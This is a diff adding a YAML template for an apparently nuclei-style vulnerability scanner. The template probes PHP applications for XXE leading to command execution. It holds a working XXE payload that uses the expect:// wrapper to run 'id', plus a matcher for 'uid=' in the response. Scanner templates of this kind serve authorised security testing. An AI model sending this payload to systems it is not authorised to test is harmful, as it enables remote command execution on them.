@@ -1,0 +1,21 @@
+id: patt-xxe-expect-01-data
+name: 'PATT xxe patt-xxe-expect-01 via data'
+severity: critical
+type: active
+tags:
+  - xxe
+  - patt
+requires:
+  - php
+description: 'PATT XXE expect:// RCE. [patt:patt-xxe-expect-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      data:
+        - '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "expect://id">]><r>&xxe;</r>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
